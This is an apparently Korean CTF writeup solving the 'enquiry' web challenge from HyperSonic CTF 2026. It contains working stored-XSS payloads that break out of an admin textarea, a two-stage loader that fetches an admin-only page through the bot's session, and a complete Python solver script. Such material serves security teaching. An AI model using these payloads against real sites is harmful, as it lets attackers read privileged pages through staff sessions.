---
title: "HyperSonic CTF 2026 enquiry Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 enquiry 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Web"]
draft: false
listed: false
---

# enquiry

## 개요

`enquiry`는 문의 등록 서비스와 관리자 봇이 함께 동작하는 웹 문제입니다. 일반 사용자는 회원가입과 로그인 후 문의를 만들 수 있고, 별도의 봇 요청 기능을 통해 관리자가 해당 문의를 확인하도록 만들 수 있습니다.

확인한 조건은 다음과 같습니다.

- 카테고리: `web`
- 문의 생성 시 `title`, `content`를 제출합니다.
- 문의 상세 조회에는 UUID 형태의 `id`가 쓰입니다.
- `/visit`은 `id`를 받아 관리자 봇이 해당 문의를 열고 답변을 저장하게 합니다.
- 일반 사용자 권한으로 `/admin` 계열 경로에 접근하면 `403`이 반환됩니다.

목표는 관리자 권한으로만 접근 가능한 정보를 사용자 문의의 답변으로 저장시키고, 저장된 답변에서 flag를 확인하는 것입니다. 풀이에서 먼저 볼 부분은 사용자 화면과 관리자 봇 화면에서 문의 내용이 다르게 렌더링되는지입니다.

## 문제 분석

글에서 사용할 용어를 먼저 정리합니다.

- `app`: 회원가입, 로그인, 문의 작성, 문의 조회를 처리하는 서비스입니다.
- `bot`: `/visit` 요청을 받아 관리자 권한으로 문의를 확인하는 서비스입니다.
- `id`: 문의를 식별하는 UUID입니다.
- `title`, `content`: 사용자가 문의를 만들 때 넣는 값입니다.
- `answer`: 관리자 답변 폼에서 확인된 답변 입력 필드입니다.
- 사용자 상세 화면: 일반 사용자가 `/inquiry/detail;id=...`로 보는 문의 화면입니다.
- 관리자 화면: 봇이 같은 문의를 관리자 권한으로 확인할 때 보는 화면입니다.

정상 흐름은 단순합니다. 사용자는 `/register`와 `/login`을 거쳐 `/inquiry/new`로 문의를 작성합니다. 문의 작성 응답의 `Location`에는 다음과 같은 형태로 UUID가 들어갑니다.

```text
/inquiry/detail;id=<uuid>
```

봇 요청 페이지는 `id`를 받아 관리자 봇을 실행합니다.

```html
<form class="form-stack" method="post" action="/visit">
  <input name="id" class="mono" placeholder="00000000-0000-0000-0000-000000000000" required>
  <button class="primary-button" type="submit">요청</button>
</form>
```

정상적인 UUID를 보내면 봇은 문의를 읽고 답변을 저장합니다. 이후 사용자 상세 화면의 답변 영역에 다음과 같은 자동 답변이 나타납니다.

```text
"<title>" 답변
안녕하세요. 문의 주신 내용 확인했습니다.
...
```

일반 사용자 화면에서는 `title`과 `content`가 HTML 엔티티로 이스케이프됩니다. 예를 들어 스크립트 조각을 넣어도 사용자 상세 화면에는 그대로 출력됩니다.

```html
<h3>&#39;...payload...&#39;</h3>
<div class="inquiry-content preline">...</div>
```

따라서 사용자 화면에서 바로 실행되는 stored XSS는 아닙니다. 하지만 봇이 보는 관리자 화면은 별도로 확인해야 합니다. 관리자 답변을 저장하는 화면에는 `document.all.answer`로 접근 가능한 답변 입력 필드가 있었고, `title` 값이 `textarea` 문맥에 들어가는 것으로 보였습니다.

이 점은 짧은 `title` payload로 확인했습니다.

```html
</textarea><svg/onload="a=document.all.answer;a.value=document.body.innerHTML;a.form.submit()">
```

이 payload를 넣은 문의에 대해 봇을 실행하자, 관리자 화면의 HTML이 사용자 답변에 저장되었습니다. 사용자 화면은 이스케이프되어 있었지만, 관리자 화면에서는 `title`이 `textarea`를 닫고 새 태그를 만들 수 있었습니다.

## 핵심 아이디어

풀이의 핵심은 관리자 봇을 `same-origin` 데이터 전달 채널로 사용하는 것입니다. 외부 콜백을 보내거나 쿠키를 훔칠 필요가 없습니다. 관리자 화면에서 JavaScript를 실행한 뒤, 결과를 `answer` 필드에 넣고 폼을 제출하면 일반 사용자도 그 답변을 읽을 수 있습니다.

처음에는 `/admin/flag`를 직접 읽는 형태를 생각할 수 있습니다. 그러나 실제 성공 경로는 한 번의 HTML 덤프로 관리자 화면의 링크를 확인한 뒤, 거기서 발견한 `/admin/inquiry/guide`를 읽는 방식이었습니다.

정리하면 다음 흐름입니다.

```text
사용자 문의 생성
-> title에서 관리자 textarea 탈출
-> 관리자 화면에서 JavaScript 실행
-> answer 필드에 결과 저장 후 submit
-> 사용자 상세 화면에서 저장된 답변 확인
```

한 가지 제약도 있었습니다. `title`에 긴 JavaScript를 모두 넣는 방식은 다루기 불편합니다. 그래서 `title`은 짧은 로더로만 쓰고, 긴 두 번째 payload는 `content`에 넣었습니다. 첫 번째 payload가 관리자 화면의 `body.innerText`를 답변으로 저장하면, 답변이 다시 관리자 화면에 렌더링되는 과정에서 두 번째 payload가 실행됩니다.

## 풀이 과정

### Step 1. 문의와 봇 답변 흐름 확인

먼저 일반 사용자 계정으로 문의를 만들고, 생성된 UUID를 `/visit`에 전달했습니다. 정상적으로 처리되면 사용자 상세 화면의 답변 영역이 비어 있지 않게 됩니다.

이 단계에서 얻은 정보는 두 가지입니다.

1. 봇은 관리자 권한으로 문의를 열고 답변을 저장합니다.
2. 답변은 원래 문의 작성자가 다시 조회할 수 있습니다.

즉 관리자 봇의 DOM에서 값을 읽어 `answer`에 넣을 수 있다면, 별도의 외부 통신 없이도 결과를 회수할 수 있습니다.

### Step 2. 사용자 화면의 이스케이프 여부 확인

`title`과 `content`에 HTML 태그와 이벤트 핸들러를 넣어 사용자 상세 화면을 확인했습니다. 사용자 화면에서는 문의 제목이 `<h3>` 안에, 문의 내용이 `div.inquiry-content` 안에 들어가지만 둘 다 HTML 엔티티로 이스케이프됩니다.

```html
<h3>&quot;&gt;&lt;svg/onload=...&gt;</h3>
<div class="inquiry-content preline">&#39;&quot;&gt;&lt;/textarea&gt;...</div>
```

이 결과만 보면 일반 사용자 화면에서는 스크립트 실행이 어렵습니다. 다만 봇은 관리자 화면을 열기 때문에, 사용자가 보는 템플릿만으로 결론을 내릴 수 없습니다.

### Step 3. 관리자 답변 폼에서 `title` textarea 탈출

관리자 화면에서 실행되는지 확인하기 위해 짧은 payload를 `title`에 넣었습니다.

```html
</textarea><svg/onload="a=document.all.answer;a.value=document.body.innerHTML;a.form.submit()">
```

여기서 필요한 동작은 세 가지입니다.

- `</textarea>`로 현재 textarea 문맥을 닫습니다.
- `<svg/onload=...>`로 JavaScript를 실행합니다.
- `document.all.answer`에 결과를 넣고 답변 폼을 제출합니다.

봇 실행 후 사용자 상세 화면의 답변에 관리자 화면의 HTML이 저장되었습니다. 이 HTML에서 관리자 화면의 링크 중 `/admin/inquiry/guide`를 확인할 수 있었습니다. 쿠키와 Web Storage에는 의미 있는 값이 없었으므로, 이후에는 관리자 권한으로 `same-origin` 페이지를 직접 읽어 답변에 저장하는 쪽으로 진행했습니다.

### Step 4. 두 단계 payload로 관리자 가이드 페이지 읽기

관리자 가이드 페이지를 읽기 위해 `title`과 `content`를 나누어 사용했습니다.

첫 번째 payload는 `title`에 들어갑니다.

```html
</textarea><svg/onload=a=document.all.answer,a.form.submit(a.value=document.body.innerText)>
```

이 코드는 관리자 화면의 `body.innerText`를 `answer`에 저장합니다. 이때 `content`에 넣어 둔 두 번째 payload 문자열도 텍스트로 함께 들어갑니다.

두 번째 payload는 `content`에 들어갑니다.

```html
</textarea><svg/onload="fetch('/admin/inquiry/guide').then(r=>r.text().then(t=>{a=document.all.answer;a.value='/admin/inquiry/guide '+r.status+' '+t.slice(0,5000);a.form.submit()}))">
```

첫 번째 submit 이후 관리자 화면이 다시 렌더링되면, 답변 textarea 안에 들어간 두 번째 payload가 다시 `</textarea>`로 탈출합니다. 그 다음 관리자 권한으로 `/admin/inquiry/guide`를 가져오고, 응답 본문을 `answer`에 저장한 뒤 폼을 다시 제출합니다.

이렇게 하면 최종적으로 사용자 상세 화면의 답변에 관리자 가이드 페이지 응답이 저장됩니다.

## Exploit / Solver

최종 solver는 다음 순서로 동작합니다.

1. 임의의 사용자 계정을 만들고 로그인합니다.
2. `title`에는 짧은 로더를, `content`에는 관리자 가이드 페이지를 가져오는 두 번째 payload를 넣어 문의를 작성합니다.
3. 생성된 `id`를 `/visit`에 전달합니다.
4. 사용자 상세 화면을 반복 조회해 flag 패턴을 찾습니다.

아래는 핵심 루틴입니다. 연결 주소와 세션 준비 코드는 생략하고, `app`과 `bot`은 각각 문의 서비스와 봇 서비스의 base URL이라고 두겠습니다.

```python
import re
import time

import requests


FLAG_RE = re.compile(r"HS\{[^}\r\n]+\}")

TITLE_STAGE = (
    "</textarea><svg/onload="
    "a=document.all.answer,"
    "a.form.submit(a.value=document.body.innerText)>"
)


def build_second_stage(path):
    js = (
        f"fetch('{path}').then(r=>r.text().then(t=>{{"
        "a=document.all.answer;"
        f"a.value='{path} '+r.status+' '+t.slice(0,5000);"
        "a.form.submit()"
        "}))"
    )
    return f'</textarea><svg/onload="{js}">'


def register_login(app):
    s = requests.Session()
    username = "u" + str(time.time_ns())
    password = "p" + str(time.time_ns())

    r = s.post(
        app + "/register",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=8,
    )
    assert r.status_code in (302, 303)

    r = s.post(
        app + "/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=8,
    )
    assert "/inquiry/new" in r.headers.get("Location", "")
    return s


def create_inquiry(app, session, title, content):
    r = session.post(
        app + "/inquiry/new",
        data={"title": title, "content": content},
        allow_redirects=False,
        timeout=8,
    )
    m = re.search(r"id=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    assert m is not None
    return m.group(1)


def solve(app, bot):
    session = register_login(app)

    guide_path = "/admin/inquiry/guide"
    inquiry_id = create_inquiry(
        app,
        session,
        TITLE_STAGE,
        build_second_stage(guide_path),
    )

    requests.post(bot + "/visit", data={"id": inquiry_id}, timeout=20)

    for _ in range(12):
        r = session.get(app + f"/inquiry/detail;id={inquiry_id}", timeout=8)
        m = FLAG_RE.search(r.text)
        if m:
            return m.group(0)
        time.sleep(2)

    raise RuntimeError("flag not found")
```

이 solver에서 `TITLE_STAGE`는 실제 데이터를 가져오지 않습니다. `TITLE_STAGE`는 두 번째 payload를 관리자 답변 textarea 안으로 옮기는 역할만 합니다. 실제 관리자 페이지 요청은 `build_second_stage()`에서 만든 payload가 처리합니다.

## 결과

두 단계 payload 실행 후 `/admin/inquiry/guide` 응답이 사용자 문의 답변에 저장되었고, 가이드 페이지 내용에서 flag를 확인했습니다.

```text
HS{b8b844df78d7f1a99c423d3d87d4e8231a7c64e6f5fec392b3e3ba13271652b8}
```
